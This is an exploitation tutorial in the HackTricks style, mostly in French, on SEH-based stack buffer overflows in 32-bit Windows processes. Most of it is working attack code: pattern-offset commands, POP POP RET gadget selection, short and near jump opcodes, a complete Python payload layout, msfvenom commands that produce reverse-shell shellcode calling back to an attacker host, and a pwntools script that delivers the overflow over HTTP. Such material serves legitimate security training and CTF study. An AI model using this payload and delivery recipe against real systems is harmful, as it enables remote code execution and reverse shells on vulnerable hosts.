# Windows SEH-based Stack Overflow Exploitation (nSEH/SEH)

{{#include ../../banners/hacktricks-training.md}}

L'exploitation basée sur SEH est une technique classique sur x86 Windows qui abuse de la chaîne Structured Exception Handler stockée sur la stack. Lorsqu'un buffer overflow sur la stack écrase les deux champs de 4 octets

- nSEH: pointer to the next SEH record, and
- SEH: pointer to the exception handler function

un attaquant peut prendre le contrôle de l'exécution en :

1) Plaçant SEH à l'adresse d'un POP POP RET gadget dans un module non protégé, de sorte que lorsqu'une exception est déclenchée le gadget renvoie vers des octets contrôlés par l'attaquant, et
2) Utilisant nSEH pour rediriger l'exécution (typiquement un short jump) vers le grand buffer débordant où se trouve le shellcode.

Cette technique est spécifique aux processus 32-bit (x86). Sur les systèmes modernes, préférez un module sans SafeSEH et ASLR pour le gadget. Les caractères problématiques incluent souvent 0x00, 0x0a, 0x0d (NUL/CR/LF) en raison des C-strings et du HTTP parsing.

---

## Finding exact offsets (nSEH / SEH)

- Faites crasher le processus et vérifiez que la chaîne SEH est écrasée (par ex., dans x32dbg/x64dbg, vérifiez la vue SEH).
- Envoyez un pattern cyclique comme données de débordement et calculez les offsets des deux dwords qui atterrissent dans nSEH et SEH.

Example with peda/GEF/pwntools on a 1000-byte POST body:
```bash
# generate pattern (any tool is fine)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
# or
python3 -c "from pwn import *; print(cyclic(1000).decode())"

# after crash, note the two 32-bit values from SEH view and compute offsets
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x32424163   # nSEH
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x41484241   # SEH
# ➜ offsets example: nSEH=660, SEH=664
```
Validez en plaçant des marqueurs à ces positions (par ex., nSEH=b"BB", SEH=b"CC"). Conservez la longueur totale constante pour rendre le crash reproductible.

---

## Choisir un POP POP RET (SEH gadget)

Vous avez besoin d'une séquence POP POP RET pour dérouler le cadre SEH et revenir dans vos octets nSEH. Trouvez-la dans un module sans SafeSEH et idéalement sans ASLR :

- Mona (Immunity/WinDbg) : `!mona modules` puis `!mona seh -m modulename`.
- x64dbg plugin ERC.Xdbg : `ERC --SEH` pour lister les gadgets POP POP RET et le statut SafeSEH.

Choisissez une adresse qui ne contient pas de badchars lorsque écrite en little-endian (par ex., `p32(0x004094D8)`). Préférez des gadgets à l'intérieur du binaire vulnérable si les protections le permettent.

---

## Technique de jump-back (short + near jmp)

nSEH ne fait que 4 octets, ce qui permet au plus un short jump de 2 octets (`EB xx`) plus du padding. Si vous devez sauter en arrière de centaines d'octets pour atteindre le début de votre buffer, utilisez un near jump de 5 octets placé juste avant nSEH et enchaînez dessus avec un short jump depuis nSEH.

Avec nasmshell:
```text
nasm> jmp -660           ; too far for short; near jmp is 5 bytes
E967FDFFFF
nasm> jmp short -8       ; 2-byte short jmp fits in nSEH (with 2 bytes padding)
EBF6
nasm> jmp -652           ; 8 bytes closer (to account for short-jmp hop)
E96FFDFFFF
```
Disposition proposée pour un payload de 1000 bytes avec nSEH à offset 660:
```python
buffer_length = 1000
payload  = b"\x90"*50 + shellcode                    # NOP sled + shellcode at buffer start
payload += b"A" * (660 - 8 - len(payload))           # pad so we are 8 bytes before nSEH
payload += b"\xE9\x6F\xFD\xFF\xFF" + b"EEE"     # near jmp -652 (5B) + 3B padding
payload += b"\xEB\xF6" + b"BB"                      # nSEH: short jmp -8 + 2B pad
payload += p32(0x004094D8)                           # SEH: POP POP RET (no badchars)
payload += b"D" * (buffer_length - len(payload))
```
Flux d'exécution :
- Une exception se produit, le dispatcher utilise le SEH écrasé.
- POP POP RET déroule la pile jusqu'à notre nSEH.
- nSEH exécute `jmp short -8` pour atteindre le 5-byte near jump.
- Le near jump atterrit au début de notre buffer où résident le NOP sled + shellcode.

---

## Caractères interdits

Générez une chaîne complète de badchar et comparez la mémoire de la stack après le crash, en supprimant les octets qui sont altérés par le parser cible. Pour les overflows basés sur HTTP, `\x00\x0a\x0d` sont presque toujours exclus.
```python
badchars = bytes([x for x in range(1,256)])
payload  = b"A"*660 + b"BBBB" + b"CCCC" + badchars  # position appropriately for your case
```
---

## Shellcode generation (x86)

Utilisez msfvenom avec vos badchars. Un petit NOP sled aide à tolérer les variations d'atterrissage.
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f python -v sc
```
Si vous le générez à la volée, le format hex est pratique à intégrer et à déhexer en Python:
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f hex
```
---
## Livraison via HTTP (CRLF précis + Content-Length)

Lorsque le vecteur vulnérable est le corps d'une requête HTTP, confectionnez une requête brute avec des CRLF précis et un Content-Length exact afin que le serveur lise l'intégralité du corps débordant.
```python
# pip install pwntools
from pwn import remote
host, port = "<TARGET_IP>", 8080
body = b"A" * 1000  # replace with the SEH-aware buffer above
req = f"""POST / HTTP/1.1
Host: {host}:{port}
User-Agent: curl/8.5.0
Accept: */*
Content-Length: {len(body)}
Connection: close

""".replace('\n','\r\n').encode() + body
p = remote(host, port)
p.send(req)
print(p.recvall(timeout=0.5))
p.close()
```
---

## Outils

- x32dbg/x64dbg pour observer la chaîne SEH et analyser le crash.
- ERC.Xdbg (x64dbg plugin) pour énumérer les gadgets SEH : `ERC --SEH`.
- Mona en alternative : `!mona modules`, `!mona seh`.
- nasmshell pour assembler des short/near jumps et copier les opcodes bruts.
- pwntools pour construire des payloads réseau précis.

---

## Remarques et mises en garde

- S'applique uniquement aux processus x86. x64 utilise un schéma SEH différent et l'exploitation basée sur SEH n'est généralement pas viable.
- Privilégiez les gadgets dans des modules sans SafeSEH ni ASLR ; sinon, trouvez un module non protégé chargé dans le processus.
- Les watchdogs de service qui redémarrent automatiquement après un crash peuvent faciliter le développement itératif d'exploits.

## Références
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [ERC.Xdbg – Exploit Research Plugin for x64dbg (SEH search)](https://github.com/Andy53/ERC.Xdbg)
- [Corelan – Exploit writing tutorial part 7 (SEH)](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-7-unicode-0day-buffer-overflow-seh-and-venetian-shellcode/)
- [Mona.py – WinDbg/Immunity helper](https://github.com/corelan/mona)

{{#include ../../banners/hacktricks-training.md}}
